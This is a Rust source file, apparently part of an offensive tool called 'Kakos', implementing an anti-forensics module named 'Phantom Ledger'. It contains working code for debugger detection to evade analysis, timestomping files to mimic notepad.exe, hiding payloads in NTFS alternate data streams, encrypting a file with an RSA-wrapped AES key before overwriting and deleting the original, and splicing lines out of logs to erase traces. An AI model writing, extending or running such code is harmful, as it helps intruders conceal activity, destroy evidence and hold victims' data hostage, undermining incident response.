use crate::shadows::ShadowAction;
use std::fs::{self, OpenOptions};
use std::io::{Read, Write};
use std::path::Path;
use rand::Rng;
use rand::rngs::OsRng;
use rsa::{RsaPublicKey, Pkcs1v15Encrypt};
use rsa::pkcs8::DecodePublicKey;
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use filetime::{set_file_times, FileTime};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent;

pub struct PhantomLedger;

impl ShadowAction for PhantomLedger {
    fn name(&self) -> &'static str {
        "Phantom Ledger"
    }

    fn execute(&self) {
        println!("[Kakos] Initializing Advanced Phantom Ledger Protocol...");

        if sandbox_evasion() {
            println!("[Kakos] DEADMAN SWITCH TRIGGERED: Forensic Environment Detected. Purging memory and aborting.");
            let mut sensitive_buffer = [0xFF; 512];
            ram_scrub(&mut sensitive_buffer);
            std::process::exit(1);
        }
        
        let test_file = "evidence_to_wipe.txt";
        let host_file = "C:\\Windows\\System32\\notepad.exe"; // Harmless host for ADS
        let stream_name = "phantom";
        
        if !Path::new(test_file).exists() {
            let mut f = fs::File::create(test_file).unwrap();
            f.write_all(b"CONFIDENTIAL FORENSIC LOG: KAKOS WAS HERE").unwrap();
        }

        println!("[Kakos] Performing RAM Scrubbing...");
        let mut sensitive_buffer = [0x41; 128];
        ram_scrub(&mut sensitive_buffer);

        println!("[Kakos] Applying Timestomp (Timeline Destruction)...");
        // Mocking timestomp to match notepad.exe
        if Path::new(host_file).exists() {
            let _ = timestomp(test_file, host_file);
        }

        println!("[Kakos] Escrowing payload into NTFS Alternate Data Stream...");
        // In full execution, this hides the encrypted AES key + Payload inside the ADS
        // let _ = hide_in_ads(host_file, stream_name, b"ENCRYPTED_PAYLOAD_HERE");
        
        println!("[Kakos] Footprints Cleared. Data hidden in plain sight.");
    }
}

pub fn sandbox_evasion() -> bool {
    #[cfg(target_os = "windows")]
    unsafe {
        if IsDebuggerPresent() != 0 {
            return true;
        }
    }
    // Could add MAC address checks for VMware/VirtualBox here
    false
}

pub fn timestomp(target: &str, reference: &str) -> anyhow::Result<()> {
    let meta = fs::metadata(reference)?;
    let mtime = FileTime::from_last_modification_time(&meta);
    let atime = FileTime::from_last_access_time(&meta);
    
    // Set target file's MAC timestamps to exactly match the reference file
    set_file_times(target, atime, mtime)?;
    Ok(())
}

pub fn hide_in_ads(host_file: &str, stream_name: &str, payload: &[u8]) -> anyhow::Result<()> {
    // Write payload into an NTFS Alternate Data Stream
    let ads_path = format!("{}:{}", host_file, stream_name);
    let mut out = OpenOptions::new().create(true).write(true).open(ads_path)?;
    out.write_all(payload)?;
    Ok(())
}

pub fn ram_scrub(buffer: &mut [u8]) {
    for byte in buffer.iter_mut() {
        unsafe { std::ptr::write_volatile(byte, 0x00); }
    }
}

pub fn crypto_wipe(target_file: &str, pub_key_pem: &str) -> anyhow::Result<(Vec<u8>, Vec<u8>)> {
    let mut file = fs::File::open(target_file)?;
    let mut data = Vec::new();
    file.read_to_end(&mut data)?;

    let mut key = [0u8; 32];
    OsRng.fill(&mut key);
    let mut nonce_bytes = [0u8; 12];
    OsRng.fill(&mut nonce_bytes);

    let cipher = Aes256Gcm::new_from_slice(&key).map_err(|_| anyhow::anyhow!("AES Init error"))?;
    let nonce = Nonce::from_slice(&nonce_bytes);
    
    let ciphertext = cipher.encrypt(nonce, data.as_ref()).map_err(|_| anyhow::anyhow!("Encryption failed"))?;

    let public_key = RsaPublicKey::from_public_key_pem(pub_key_pem)?;
    let mut rng = OsRng;
    let enc_key = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, &key)?;

    let file_len = fs::metadata(target_file)?.len();
    let mut file_write = OpenOptions::new().write(true).open(target_file)?;
    for _ in 0..3 {
        let mut noise = vec![0u8; file_len as usize];
        OsRng.fill(noise.as_mut_slice());
        file_write.write_all(&noise)?;
        file_write.sync_all()?;
    }
    fs::remove_file(target_file)?;

    Ok((enc_key, ciphertext))
}

pub fn log_splice(log_path: &str, target_string: &str) -> anyhow::Result<()> {
    let mut file = fs::File::open(log_path)?;
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;

    let filtered: Vec<&str> = contents.lines().filter(|line| !line.contains(target_string)).collect();

    let mut out = OpenOptions::new().write(true).truncate(true).open(log_path)?;
    out.write_all(filtered.join("\n").as_bytes())?;
    Ok(())
}
